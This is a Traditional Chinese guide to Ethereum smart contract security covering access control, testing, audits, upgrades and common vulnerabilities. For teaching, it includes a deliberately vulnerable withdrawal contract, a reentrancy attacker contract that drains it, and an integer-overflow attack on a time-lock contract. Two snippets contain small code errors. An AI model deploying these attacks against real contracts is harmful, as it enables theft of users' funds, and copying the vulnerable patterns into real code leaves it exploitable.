---
title: 智慧型合約安全
description: 建立安全的以太坊智慧型合約指南之概觀
lang: zh-tw
---

智慧型合約極度靈活，且能夠控制大量值和資料，同時基於部署在區塊鏈上的程式碼執行不可變的邏輯。 這建立了活躍的去信任和去中心化的應用程式生態系統，它與傳統系統相比有許多優點。 這也為謀求透過智慧型合約漏洞獲利的攻擊者提供機會。

公共區塊鏈，例如以太坊，使智慧型合約的安全議題更加複雜。 已部署的合約程式碼_通常_無法變更，以修補安全缺陷；而要追蹤從智慧型合約竊取的資產也十分困難，且因為物件的不可變性，大多無法挽回。

雖然數字有差異，但因智慧型合約安全缺陷而遭竊取或損失的總額，估計超過 10 億美元。 備受關注的事件如 [DAO 駭客攻擊](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/)（駭客竊取 360 萬以太幣，現價超過 10 億美元）；[Parity 多重簽章錢包駭客攻擊](https://www.coindesk.com/30-million-ether-reported-stolen-parity-wallet-breach)（駭客竊取 3 千萬美元）；以及 [Parity 凍結錢包問題](https://www.theguardian.com/technology/2017/nov/08/cryptocurrency-300m-dollars-stolen-bug-ether)（超過 3 億美元的以太幣遭到永久凍結）。

前面提到的問題，促使開發者將努力打造安全、健全且有韌性的智慧型合約視為當務之急。 我們必須嚴肅看待智慧型合約的安全性，每個開發者都需要好好加以瞭解。 此指南將涵蓋以太坊開發者應有的資安考量，並探索提升智慧型合約安全性的資源。

## 基本資訊 {#prerequisites}

請務必熟悉[開發智慧型合約的基本知識](/developers/docs/smart-contracts/)，再來瞭解安全性。

## 建立安全的以太坊智慧型合約指南 {#smart-contract-security-guidelines}

### 1.  設計正確的存取控制 {#design-proper-access-controls}

在智慧型合約中，任何外部帳戶 (EOA) 或合約帳戶都可以調用標記為 `public` 或 `external` 的函數。 如果你想要其他人與你的智慧型合約互動，務必指定函數的公共可見性。 標記為 `private` 的函數只能被智慧型合約內部的函數調用，外部帳戶無法調用這種函數。 讓每個網路參與者存取智慧型合約函數可能造成一些問題，尤其是這表示人人都能執行須謹慎以對的操作（例如鑄造新代幣）。

為了防止未授權者使用智慧型合約函數，務必落實安全存取控制。 存取控制機制將使用智慧型合約中特定函數的功能限縮給某些核准實體，例如負責管理合約的帳戶。 在智慧型合約中，**可擁有模式**和**以角色為基礎的控制**是兩個有效落實存取控制的方法。

#### 可擁有模式 {#ownable-pattern}

在可擁有模式下，會在建立合約的過程中，將一個地址設為合約的「擁有者」。 受保護的函數會配置一個 `OnlyOwner` 修飾符，確保執行函數前，先驗證調用地址的身分。 為防止不受歡迎的存取，合約擁有者以外的地址對受保護函數的調用都會遭到撤銷。

#### 以角色為基礎的控制 {#role-based-access-control}

在一個智慧型合約中，將一個地址註冊為 `Owner` 會導致集中風險及單點失效。 假如合約擁有者的帳戶金鑰遭竊，攻擊者就可以攻擊合約擁有者的智慧型合約。 這就是為什麼使用以角色為基礎的控制模式和多重管理帳戶可能是更好的方法。

在以角色為基礎的控制下，存取敏感函數的權限會分散給一組受信任的參與者。 例如一個帳戶可能負責鑄造代幣；另一個帳戶則執行升級或暫停合約。 這種分散存取控制的做法排除了單點失效，也減少使用者的信任假設。

##### 使用多重簽章錢包

另一個落實安全存取控制的方法是使用[多重簽章帳戶](/developers/docs/smart-contracts/#multisig)管理合約。 不同於一般外部帳戶 (EOA)，多重簽章帳戶由多個實體持有，而且需要最小數量的帳戶簽章，例如 5 個持有人中 3 個人的簽章，才能執行交易。

使用多簽存取控制，可多添一層安全性，因為對合約採取執行任何操作都需要多位合約持有人的同意。 這在使用可擁有模式的情況下尤其必要，因為它讓攻擊者或不肖內部人士更難操縱敏感的合約函數以達成其惡意目的。

### 2. 使用 require()、assert() 和 revert() 陳述式保護合約運作 {#use-require-assert-revert}

如前面所說的，一旦將智慧型合約部署到區塊鏈上，任何人都可以調用智慧型合約內的公共函數。 因為無法事先預期外部帳戶將如何與你的合約互動，理想做法是在部署前落實內部保障措施，防止會造成問題的操作。 你可以強制使用者對智慧型合約執行正確行為，如果執行操作未能通過某些條件，可以使用 `require()`、`assert()` 和 `revert()` 陳述式，來啟動例外狀況並撤銷狀態變更。

**`require()`**：`require` 會定義於函數的開頭，確保在執行調用函數前，達到預先定義的條件。 `require` 陳述式可以用於驗證使用者輸入的資料、確認狀態變數或在繼續執行函數前驗證調用帳戶的身分。

**`assert()`**：`assert()` 用於偵測內部錯誤和確認程式碼是否違反「不變性」。 不變性是在執行所有函數時，都應為真的合約狀態的邏輯斷言。 不變性的一個範例就是代幣合約的最大總供應量或餘額。 使用 `assert()` 確保你的合約絕不會進入脆弱狀態，若發生這種狀況，所有狀態變數將會回復到先前狀態。

**`revert()`**：`revert()` 可以運用在未滿足指定條件時，觸發例外狀況的 if-else 陳述式。 以下範例合約使用 `revert()` 來保護函數的執行：

```
pragma solidity ^0.8.4;

contract VendingMachine {
    address owner;
    error Unauthorized();
    function buy(uint amount) public payable {
        if (amount > msg.value / 2 ether)
            revert("Not enough Ether provided.");
        // Perform the purchase.
    }
    function withdraw() public {
        if (msg.sender != owner)
            revert Unauthorized();

        payable(msg.sender).transfer(address(this).balance);
    }
}
```

### 3. 測試智慧型合約和驗證程式碼的正確性 {#test-smart-contracts-and-verify-code-correctness}

在[以太坊虛擬機](/developers/docs/evm/)上執行的程式碼具備不可變性，代表智慧型合約在開發階段需要接受更高階的品質評估。 全面測試你的合約並注意任何超出預期的結果，將大大提升合約的安全性，且長期來看可保護使用者。

常用方法是使用預期合約會接受的使用者模擬資料，來編寫小型單元測試。 [單元測試](/developers/docs/smart-contracts/testing/#unit-testing)適合測試特定函數的功能，並確保智慧型合約如預期運作。

很可惜，單元測試單獨使用時，提升智慧型合約安全性的成效並不顯著。 單元測試可能證明函數可以正確執行模擬資料，但單元測試的效果取決於編寫測試的品質。 這使得偵測未注意到、但會破壞智慧型合約安全性的邊緣案例與漏洞非常困難。

更好的做法是結合單元測試與屬性測試，並運用[靜態和動態分析](/developers/docs/smart-contracts/testing/#static-dynamic-analysis)執行。 靜態分析依賴低階表示法，像是[控制流程圖](https://en.wikipedia.org/wiki/Control-flow_graph)和[抽象語法樹](https://deepsource.io/glossary/ast/)，來分析可觸及的程式狀態和執行路徑。 同時，動態分析技術（如[智慧型合約模糊測試](https://www.cyfrin.io/blog/smart-contract-fuzzing-and-invariants-testing-foundry)）則使用隨機輸入值執行合約程式碼，以偵測違反安全屬性的操作。

[形式驗證](/developers/docs/smart-contracts/)是另一項驗證智慧型合約安全屬性的技術。 不同於一般測試，形式驗證可以确凿地證明智慧型合約不存在任何錯誤。 這種做法會建立描述預期安全屬性的形式規范，並證明合約的形式模型遵守此規范。

### 4 邀請獨立審查程式碼 {#get-independent-code-reviews}

測試完合約後，最好請其他人來確認原始程式碼是否有任何安全性問題。 測試沒辦法涵蓋智慧型合約內的每一處瑕疵，但進行獨立審查可增加發現漏洞的可能性。

#### 審核 {#audits}

委託智慧型合約審核服務是進行獨立程式碼審查的方法之一。 審核者在確保智慧型合約安全性，且沒有品質瑕疵和設計錯誤上扮演重要角色。

但是，你應該避免把審核當成一勞永逸地的解決方案。 智慧型合約審核不可能發現每一個錯誤，其主要目的是再次進行審查，幫助開發者偵測在開發初期和測試階段沒有發現的問題。 你也應該遵循與審核者合作的最佳案例，例如製作完整的程式碼記錄以及新增內嵌注釋，才能從智慧型合約審核中獲得最大效益。

- [智慧型合約審核提示和技巧](https://twitter.com/tinchoabbate/status/1400170232904400897) - _@tinchoabbate_
- [充分利用你的審核](https://inference.ag/blog/2023-08-14-tips/) - _推理_

#### 漏洞懸賞 {#bug-bounties}

設立漏洞懸賞賞計畫是另一個實現外部程式碼審查的方法。 漏洞懸賞會發放經濟性獎勵給發現應用程式漏洞的個人（通常是白帽駭客）。

若正確運用，漏洞懸賞可以給予駭客社群檢查你程式碼重大缺陷的動機。 一個實際案例是「無限貨幣錯誤」，讓攻擊者可以在以太坊的[二層](/layer-2/)協定 [Optimism](https://www.optimism.io/) 上建立無限數量的以太幣。 幸好有位白帽駭客[發現了這個缺陷](https://www.saurik.com/optimism.html)，並通知了相關團隊[，因此獲得了一大筆獎金](https://cryptoslate.com/critical-bug-in-ethereum-l2-optimism-2m-bounty-paid/)。

有效的漏洞懸賞獎金機制，應與面臨風險的資金成比例。 就像「[Scaling Bug Bounty（擴大漏洞懸賞）](https://medium.com/immunefi/a-defi-security-standard-the-scaling-bug-bounty-9b83dfdc1ba7)」一文所說，這種方法讓人在財務上有動機盡責揭露，而非利用漏洞。

### 5 開發智慧型合約時遵循最佳案例 {#follow-smart-contract-development-best-practices}

不能因為有審核和漏洞懸賞就不盡責編寫高品質程式碼。 優良的智慧型合約安全性始於遵循正確的設計和開發流程：

- 將所有的程式碼儲存在版本控制系統中，例如 git

- 修改所有程式碼都需透過提取請求完成

- 確保所有的提取請求都至少有一個獨立審核人：如果是自己獨自開發專案，可斟酌找其他開發者交換審查程式碼

- 使用[開發環境](/developers/docs/frameworks/)來測試、編譯、部署智慧型合約

- 透過基本的程式碼分析工具，例如 [Cyfrin Aaderyn](https://github.com/Cyfrin/aderyn)、Mythril 和 Slither，來執行程式碼。 理想情况下，這應該在合併提取請求及檢查輸出結果異同前完成

- 確認程式碼編譯沒有錯誤，且 Solidity 編譯器不會傳出警告

- 正確記錄程式碼（使用 [NatSpec](https://solidity.readthedocs.io/en/develop/natspec-format.html)），並運用簡單易懂的語言詳細描述合約架構。 這樣才容易讓其他人審核和審查你的程式碼。

### 6. 採行健全的災害復原計畫 {#implement-disaster-recovery-plans}

設計安全的存取控制、採用函數修飾符和其他上述提議，可改善智慧型合約安全，但不能排除惡意入侵的可能性。 建立安全的智慧型合約需要做好「防範錯誤的準備」，以及對攻擊作出有效反應的備援計畫。 正確的災害復原計畫包含下列部分或全部要素：

#### 合約升級 {#contract-upgrades}

雖然以太坊智慧型合約是預設不得變更，但可以透過升級模式來達成某程度的變更。 當重大缺陷迫使舊合約無法使用，而部署新邏輯是最可行的選擇時，就必須升級合約。

合約升級機制的運作方式不同，「代理人模式」是升級智慧型合約最常見的方法。 [代理人模式](https://www.cyfrin.io/blog/upgradeable-proxy-smart-contract-pattern)會將應用程式的狀態和邏輯拆分成_兩個_合約。 第一個合約（稱為「代理人合約」）儲存狀態變數（例如使用者餘額）；第二個合約（稱為「邏輯合約」）保存執行合約函數的程式碼。

帳戶只和代理人合約互動，代理人合約再用低階調用 [`delegatecall()`](https://docs.soliditylang.org/en/v0.8.16/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries) 發送所有函數調用至邏輯合約。 和一般的訊息調用不同，`delegatecall()` 會確保在邏輯合約地址上執行的程式碼是在調用合約的情境下執行。 這表示邏輯合約將永遠把資料寫入代理人的存儲空間（而不是自己的存儲空間），且會保留 `msg.sender` 與 `msg.value` 的原始值。

委託邏輯合約的調用必須將其地址儲存在代理人合約的存儲空間。 因此，升級合約的邏輯只是部署另一個邏輯合約，並將新地址儲存至代理人合約。 之後，代理人合約的調用都會自動傳送至新的邏輯合約，讓你在未實際修改程式碼的情況下「升級」合約。

[更多升級合約相關資訊](/developers/docs/smart-contracts/upgrading/)。

#### 緊急停止 {#emergency-stops}

如前所述，即便進行大量審核和測試，仍不可能發現智慧型合約的所有漏洞。 如果已經部署的程式出現漏洞，就不可能修補，因為你無法改變在合約地址執行的程式碼。 而且，升級機制（例如，代理人模式）可能需要時間完成（通常需要不同相關方的同意），因此會給攻擊者更多時間造成更大傷害。

極端選擇是執行「緊急停止」函數，阻止調用合約中的易受攻擊函數。 緊急停止通常包含下列要素：

1. 指示智慧型合約是否在停止狀態的全域布林變數。 建立合約時，此變數被設定為 `false`，一旦合約終止，就會回復為 `true`。

2. 執行時參照這個布林變數的函數。 在智慧型合約不在終止狀態時，可存取這類函數；但啟動緊急停止功能後，此類函數就無法存取。

3. 可以存取緊急停止函數的實體，可將布林變數設定為 `true`。 為防止惡意行動，可以限制只有受信任地址（例如，合約持有人）才可調用此函數。

一旦合約啟動緊急停止，將無法調用特定函數。 藉由將指定函數包裹在參照全域變數的修飾符中來達成此目的。 以下是說明如何在合約中採用此模式的[範例](https://github.com/fravoll/solidity-patterns/blob/master/EmergencyStop/EmergencyStop.sol)：

```solidity
// This code has not been professionally audited and makes no promises about safety or correctness. Use at your own risk.

contract EmergencyStop {

    bool isStopped = false;

    modifier stoppedInEmergency {
        require(!isStopped);
        _;
    }

    modifier onlyWhenStopped {
        require(isStopped);
        _;
    }

    modifier onlyAuthorized {
        // Check for authorization of msg.sender here
        _;
    }

    function stopContract() public onlyAuthorized {
        isStopped = true;
    }

    function resumeContract() public onlyAuthorized {
        isStopped = false;
    }

    function deposit() public payable stoppedInEmergency {
        // Deposit logic happening here
    }

    function emergencyWithdraw() public onlyWhenStopped {
        // Emergency withdraw happening here
    }
}
```

此範例展現緊急停止的基本特徵：

- `isStopped` 是布林變數，在開始時計算為為 `false`，當合約進入緊急模式時即變更為 `true`。

- 函數修飾符 `onlyWhenStopped` 和 `stoppedInEmergency` 會檢查 `isStopped` 變數。 `stoppedInEmergency` 用於控制合約出現漏洞時，無法存取的函數（例如，`deposit()`）。 這些函數的調用將直接遭到撤銷。

`onlyWhenStopped` 用於在緊急情況下應調用的函數（例如，`emergencyWithdraw()`）。 這類函數有助解決困境，因此被排除在「受限函數」清單之外。

緊急停止功能提供處理智慧型合約嚴重漏洞的有效權宜之計。 然而，這種方法需要使用者相信開發者不會基於自身利益啟動緊急停止功能。 面對這種疑慮，可能的解決方法是透過鏈上投票機制、時間鎖定、或多簽錢包核准等分散式方法管理緊急停止功能。

#### 事件監控 {#event-monitoring}

[事件](https://docs.soliditylang.org/en/v0.8.15/contracts.html#events)可以追蹤智慧型合約函數調用狀況和監控狀態變數的變化。 理想做法是當某一方執行攸關安全的行動（例如，提領資金）時，讓智慧型合約釋出事件。

記錄事件和鏈外監控事件，可以掌握合約運作狀況並有助及早發現惡意行動。 這表示你的團隊可以快速對駭客攻擊做出反應，並採取行動減輕對使用者的衝擊，例如：暫停函數或執行升級。

你也可以選擇現成的監控工具，在有人和你的合約互動時，這些工具會自動傳送警告通知。 這些工具可讓你基於不同的觸發器，例如：交易量、函數調用頻率或涉及特定函數時，建立自訂警告通知。 例如：你可以編寫在單筆交易提款金額超過特定閾值時傳送警告。

### 7. 設計安全治理體系 {#design-secure-governance-systems}

你可能想要藉由移交重要智慧型合約的控制權給社群成員，來分散管理（去中心化）應用程式。 這種情況下，智慧型合約系統將包含一個治理模組，也就是允許社群成員透過鏈上治理體系核准管理行動的機制。 例如，採納升級代理人合約的提案，可由代幣持有人投票決定。

去中心化治理的好處在於讓開發者和終端使用者的利益一致。 儘管如此，若未正確落實智慧型合約治理機制，仍可能產生新的風險。 可能出現的情況是，一位攻擊者透過[閃電貸](/defi/#flash-loans)取得大量投票權（以持有代幣數量決定），推動通過惡意提案。

預防鏈上治理相關問題的方法之一是[使用時間鎖定](https://blog.openzeppelin.com/protect-your-users-with-smart-contract-timelocks/)。 時間鎖定是直到特定時間過後，才讓智慧型合約執行某些動作。 其他策略包括：根據每一個代幣被鎖定的時間賦予「投票加權」，或以歷史期間（例如：過去的 2-3 個區塊）而不是目前區塊，來衡量一個地址的投票權。 這兩種方法都能降低快速累積投票權，進而影響鏈上投票結果的情況。

藉由共享連結，了解關於[設計安全管理體系](https://blog.openzeppelin.com/smart-contract-security-guidelines-4-strategies-for-safer-governance-systems/)、[去中心化自治組織的不同投票機制](https://hackernoon.com/governance-is-the-holy-grail-for-daos)，以及[利用去中心化金融的常見去中心化自治組織攻擊媒介](https://dacian.me/dao-governance-defi-attacks)的更多資訊。

### 8. 將程式碼的複雜性降到最低 {#reduce-code-complexity}

傳統的軟體開發者都熟悉 KISS (「保持簡約」)，也就是不要在軟體中引進不必要複雜設計的原則。 這是因為長期以來，人們都認為「複雜系統會發生複雜的故障」，且更容易造成代價高昂的錯誤。

編寫智慧型合約尤其注重簡約，因為智慧型合約可能控制龐大資金。 保持簡約的秘訣：編寫智慧型合約時盡可能重複使用既有庫，例如 [OpenZeppelin Contracts](https://docs.openzeppelin.com/contracts/4.x/)。 因為這些庫已經通過開發者廣泛審核和測試，使用時可以降低從零開始開發新功能出現漏洞的幾率。

另一個建議是編寫小型函數，並將商業邏輯拆分成多個合約，確立模組化合約。 編寫較簡單的程式碼不只能縮小智慧型合約中的受攻擊面，也使判斷整個系統的正確性更簡單，亦能提早偵測可能的設計錯誤。

### 9. 防範一般的智慧型合約漏洞 {#mitigate-common-smart-contract-vulnerabilities}

#### 重入攻擊 {#reentrancy}

以太坊虛擬機不允許並行執行，也就是無法同時執行牽涉同一訊息調用的兩個合約。 一個外部調用會終止調用合約的執行和記憶體，直到這個調用返回結果，這時才會繼續正常執行。 這個過程可被正式稱為將[控制流程](https://www.computerhope.com/jargon/c/contflow.htm)轉移到另一個合約。

雖然大多數情況下無害，但轉移控制流程至不受信任的合約可能引起重入攻擊等問題。 在初始函數調用完成前，若惡意合約回呼易受攻擊的合約，就是重入攻擊。 我們可以舉一個例子來說明這種攻擊類型。

試想有個簡單的智慧型合約（稱為「Victim」），可以讓任何人存入與提領以太幣：

```solidity
// This contract is vulnerable. Do not use in production

contract Victim {
    mapping (address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```

此合約公布了一個 `withdraw()` 函數，允許使用者提領先前存入合約內的以太幣。 處理提款時，合約執行以下操作：

1. 檢查使用者的以太幣餘額
2. 匯出資金至調用地址
3. 將餘額重置為 0，避免使用者進一步提領

`Victim` 合約中的 `withdraw()` 函數遵循「檢查-互動-效果」模式。 若滿足必要的執行條件，就會進行_檢查_（即使用者的以太幣餘額是正數)，接著再傳送以太幣至調用者的地址，進行_互動_，最後套用交易_效果_（即減少使用者的餘額）。

假如是外部帳戶 (EOA) 調用 `withdraw()`，函數將如預期執行：`msg.sender.call.value()` 傳送以太幣給調用者。 然而，如果調用 `withdraw()` 的 `msg.sender` 是智慧型合約帳戶，使用`msg.sender.call.value()` 傳送資金，也會觸發儲存在該帳戶地址的程式碼執行。

試想這是部署在合約地址的程式碼：

```solidity
 contract Attacker {
    function beginAttack() external payable {
        Victim(victim_address).deposit.value(1 ether)();
        Victim(victim_address).withdraw();
    }

    function() external payable {
        if (gasleft() > 40000) {
            Victim(victim_address).withdraw();
        }
    }
}
```

這個合約在設計上要達成三個目的：

1. 接受其他帳戶（可能是攻擊者的外部帳戶）的存款
2. 存入 1 以太幣至 Victim 合約
3. 提領存儲在智慧型合約中的 1 以太幣

這裡沒有任何問題，除了傳入 `msg.sender.call.value` 剩餘的燃料超過 40,000 時，`Attacker` 中的另一個函數會再次調用 `Victim` 內的 `withdraw()`。 這讓 `Attacker` 在第一次調用 `withdraw` 結束_之前_，可以一再進入 `Victim` 提領更多資金。 這個循環看起來像這樣：

```solidity
- Attacker's EOA calls `Attacker.beginAttack()` with 1 ETH
- `Attacker.beginAttack()` deposits 1 ETH into `Victim`
- `Attacker` calls `withdraw() in `Victim`
- `Victim` checks `Attacker`’s balance (1 ETH)
- `Victim` sends 1 ETH to `Attacker` (which triggers the default function)
- `Attacker` calls `Victim.withdraw()` again (note that `Victim` hasn’t reduced `Attacker`’s balance from the first withdrawal)
- `Victim` checks `Attacker`’s balance (which is still 1 ETH because it hasn’t applied the effects of the first call)
- `Victim` sends 1 ETH to `Attacker` (which triggers the default function and allows `Attacker` to reenter the `withdraw` function)
- The process repeats until `Attacker` runs out of gas, at which point `msg.sender.call.value` returns without triggering additional withdrawals
- `Victim` finally applies the results of the first transaction (and subsequent ones) to its state, so `Attacker`’s balance is set to 0
```

總起來說，因為調用者的餘額並非 0，直到函數執行結束前，後續的調用都能成功執行，並允許調用者多次提領餘額。 這類攻擊可以被用於將智慧型合約內的所有資金提領一空，如同 [2016 年的 DAO 駭客攻擊](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)。 就像[重入入侵公開清單](https://github.com/pcaversaccio/reentrancy-attacks)所示，如今重入攻擊仍是智慧型合約面臨的嚴重問題。

##### 如何預防重入攻擊

處理重入攻擊的方法是遵循[檢查 - 效果 - 互動模式](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern)。 這個模式指示函數如以下次序執行，在繼續執行下一個動作前，必須先執行進行必要檢查的程式碼，然後是執行操縱合約狀態的程式碼，最後才執行與其他合約或外部帳戶互動的程式碼。

依照檢查 - 效果 - 互動模式改寫 `Victim` 合約如下：

```solidity
contract NoLongerAVictim {
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);
    }
}
```

這個合約如下執行：_檢查_使用者餘額、套用 `withdraw()` 函數的_效果_（將使用者的餘額重置為 0），再繼續執行_互動_（傳送以太幣至使用者地址）。 這能確保合約在外部調用前更新存儲空間，排除會引發第一次攻擊的重入條件。 `Attacker` 合約仍然可能回呼 `NoLongerAVictim`，但因為 `balances[msg.sender]` 已設定為 0，所以再次提領時會出現錯誤。

另一個方法是使用相斥鎖定（一般稱為「Mutex」），鎖定合約的部分狀態，直到完成函數調用。 這個方法是在函數執行前，將一個布林變數設定為 `true`，調用完成後再把布林變數回復為 `false`。 如以下範例所示，使用 Mutex 可保護函數在初始調用尚未完成前，不被重複調用，並有效阻止重入。

```solidity
pragma solidity ^0.7.0;

contract MutexPattern {
    bool locked = false;
    mapping(address => uint256) public balances;

    modifier noReentrancy() {
        require(!locked, "Blocked from reentrancy.");
        locked = true;
        _;
        locked = false;
    }
    // This function is protected by a mutex, so reentrant calls from within `msg.sender.call` cannot call `withdraw` again.
    //  The `return` statement evaluates to `true` but still evaluates the `locked = false` statement in the modifier
    function withdraw(uint _amount) public payable noReentrancy returns(bool) {
        require(balances[msg.sender] >= _amount, "No balance to withdraw.");

        balances[msg.sender] -= _amount;
        bool (success, ) = msg.sender.call{value: _amount}("");
        require(success);

        return true;
    }
}
```

你還可以使用[提取款項](https://docs.openzeppelin.com/contracts/4.x/api/security#PullPayment)系統，要求使用者從智慧型合約提款，而不是使用「推送付款」系統傳送資金至帳戶。 如此一來，就可免除在未知地址上意外啟動程式碼的可能性（也能防止特定阻斷服務攻擊）。

#### 整數下溢與上溢 {#integer-underflows-and-overflows}

算術運算結果超出可接受數值範圍，必須「退位」至最低代表值時，就是整數上溢。 例如：`uint8` 最多只能儲存相當於 2^8-1=255 的值。 若算術運算結果導致大於 `255` 的值，就屬於上溢，並會將 `uint` 重置為 `0`，類似汽車里程表達到里程數上限 (999999) 時，將重置為 0。

整數下溢的發生原因也是如此：算術運算結果小於可接受範圍。 例如你嘗試要對 `uint8` 的 `0` 進行遞減，結果就會是進位至最高代表值 (`255`)。

整數上溢和下溢都可能對合約狀態變數產生非預期的變更，導致預料外的執行。 以下範例顯示攻擊者可以利用智慧型合約內的算術上溢執行無效操作：

```
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for at least a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

##### 如何預防整數下溢和上溢

自 0.8.0 版本起，Solidity 編譯器拒絕使用會導致整數下溢和上溢的程式碼。 然而，使用較低版本編譯器編譯的合約應該檢查涉及算術運算的函數，或使用庫（例如 [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)）來檢查下溢/上溢。

#### 操縱預言機 {#oracle-manipulation}

[預言機](/developers/docs/oracles/)會取得鏈外資訊，並把這些資訊傳到鏈上供智慧型合約使用。 使用預言機，可以設計與鏈外系統（例如資本市場）互通的智慧型合約，大幅拓展應用範圍。

然而，若預言機遭到破壞，將不正確的資訊傳到鏈上，智慧型合約將會根據不正確輸入資料執行，可能引起問題。 這是「預言機問題」的基礎，也就是要確保來自區塊鏈預言機的是正確、及時的最新資訊。

可能產生的相關安全性疑慮，就是使用如去中心化交易所等鏈上預言機，取得資產的現貨價格。 [去中心化金融 (DeFi)](/defi/) 產業的借貸平台通常都藉此判斷使用者抵押品的價值，再決定借貸額度。

去中心化交易所的價格之所以準確，大體上倚靠套利者在市場上維持市場均衡。 然而，這也提供操縱空間，若鏈上預言機可根據歷史交易模式（通常使用的方法）計算資產價格時，更是如此。

例如，在和你的借貸合約互動之前，攻擊者可藉由取得閃電貸的權利，人為膨脹某資產的現貨價格。 在去中心化交易所查詢該資產的價格時，會傳回高於正常價值（因為攻擊者大量「買單」扭曲對該資產的需求量）的價格，因而允許他們超額借貸。 像這樣的「閃電貸攻擊」已被用來入侵依靠價格預言機的去中心化金融應用程式，造成協定損失數百萬美元。

##### 如何預防操縱預言機

[避免預言機操縱](https://www.cyfrin.io/blog/price-oracle-manipultion-attacks-with-examples)的最低要求是，使用去中心化預言機網路，來查詢來自多個來源的資訊以避免單點故障。 在大多數情況下，去中心化預言機內建加密經濟獎勵機制，促進預言機節點報告正確資訊，因此比集中化預言機安全。

若你打算在鏈上預言機查詢資產價格，可考慮使用採用時間加權平均價格 (TWAP) 機制的預言機。 [時間加權平均價格預言機](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles)會查詢兩個不同時間點（你可以更改時間點）的資產價格，再根據得到數據的平均值計算現貨價值。 選擇時間較長的價格可保護協定免於價格操縱，因為近期大量的交易下單不會對資產價格造成影響。

## 開發者的智慧型合約安全性資源 {#smart-contract-security-resources-for-developers}

### 分析智慧型合約和驗證程式碼正確性的工具 {#code-analysis-tools}

- **[測試工具和庫](/developers/docs/smart-contracts/testing/#testing-tools-and-libraries)** - _一系列執行智慧型合約單元測試、靜態分析和動態分析的產業標準工具和庫。_

- **[形式驗證工具](/developers/docs/smart-contracts/formal-verification/#formal-verification-tools) - **_驗證智慧型合約功能正確性和檢查不變性的工具。_

- **[智慧型合約審核服務](/developers/docs/smart-contracts/testing/#smart-contract-auditing-services)**：_提供以太坊開發專案智慧型合約審核服務的組織清單。_

- **[漏洞懸賞平台](/developers/docs/smart-contracts/testing/#bug-bounty-platforms)** - _協調漏洞懸賞計畫和發放獎金給揭發智慧型合約重大漏洞者的平台。_

- **[分叉檢查工具](https://forkchecker.hashex.org/)** - _檢查分叉合約所有可用資訊的線上免費工具。_

- **[應用程式二進制介面編碼器](https://abi.hashex.org/)** - _對 Solidity 合約的函數和建構函數引數進行編碼的線上免費服務。_

- **[Aderyn](https://github.com/Cyfrin/aderyn)** - _Solidity 靜態分析器，透過周遊抽象語法樹 (AST) 找出可疑漏洞，並以易於使用的 Markdown 格式列印問題。_

### 監視智慧型合約的工具 {#smart-contract-monitoring-tools}

- **[OpenZeppelin Defender Sentinels](https://docs.openzeppelin.com/defender/v1/sentinel)** - _一個自動監控和回應智慧型合約事件、函式和交易參數的工具。_

- **[Tenderly Real-Time Alerting](https://tenderly.co/alerting/)**：_當智慧型合約或錢包出現不尋常的和意外事件時，可以獲得即時通知的工具。_

### 智慧型合約的安全管理工具 {#smart-contract-administration-tools}

- **[OpenZeppelin Defender Admin](https://docs.openzeppelin.com/defender/v1/admin)** - _管理智慧型合約運作，包括存取控制、升級和暫停的介面。_

- **[Safe](https://safe.global/)** - _在以太坊上執行、需要達到最低核准人數（N 人中的M 人），才能執行交易的智慧型合約數位錢包。_

- **[OpenZeppelin Contracts](https://docs.openzeppelin.com/contracts/4.x/)** - _執行合約所有權、升級、存取控制、治理、暫停等管理功能的合約庫。_

### 智慧型合約審核服務 {#smart-contract-auditing-services}

- **[ConsenSys Diligence](https://consensys.net/diligence/)** - _協助區塊鏈生態系系統中的專案，確保其協定處於可發布狀態，且用於保護使用者的智慧型合約審核服務。_

- **[CertiK](https://www.certik.com/)** - _率先致力於智慧型合約和區塊鏈網路上使用最新形式驗證技術的區塊鏈安全公司。_

- **[Trail of Bits](https://www.trailofbits.com/)** - _結合安全性研究和攻擊者心理來降低風險和強化程式碼的網絡安全公司。_

- **[PeckShield](https://peckshield.com/)** - _為整個區塊鏈生態系統的安全性、隱私權、易用性提供產品和服務的區塊鏈安全公司。_

- **[QuantStamp](https://quantstamp.com/)** - _經由安全性和風險評估服務促進廣泛採用區塊鏈技術的審核服務。_

- **[OpenZeppelin](https://www.openzeppelin.com/security-audits)** - _提供去中心化系統安全性審核的智慧型合約安全公司。_

- **[Runtime Verification](https://runtimeverification.com/)** - _專精於智慧型合約形式模型和驗證的安全公司。_

